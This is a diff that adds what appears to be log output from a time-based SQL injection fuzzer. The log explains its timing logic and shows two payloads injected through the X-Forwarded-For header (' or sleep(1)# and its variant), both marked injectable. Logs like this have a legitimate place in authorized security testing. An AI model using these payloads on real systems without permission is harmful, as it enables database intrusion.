@@ -1,0 +1,32 @@
+=================== [ Key Terms] ===================
+Index = Configured Constant (Delay)
+Base Index Record = Server Ping Before Fuzzing
+Benching Record  = Base Index Record + Index
+Fuzzing Record = Time taken to process request with Index
+
+===================== [ Logic] =====================
+If Fuzzing Record is greater than Benching Record,
+treat as a positive; else, treat as a negative.
+
+
+
+[+] Injection : X-Forwarded-For : ' or sleep(1)#
+
+[+] Header : X-Forwarded-For
+
+[*] Index Record : 0.000160932540894
+[*] Benching Record : 1.00016093254
+[*] Fuzzing Record : 9.01
+[!] Test 436 is Injectable.
+__________________________________
+
+[+] Injection : X-Forwarded-For : ' or sleep(1)='
+
+[+] Header : X-Forwarded-For
+
+[*] Index Record : 0.000378847122192
+[*] Benching Record : 1.00037884712
+[*] Fuzzing Record : 18.02
+[!] Test 438 is Injectable.
+__________________________________
+
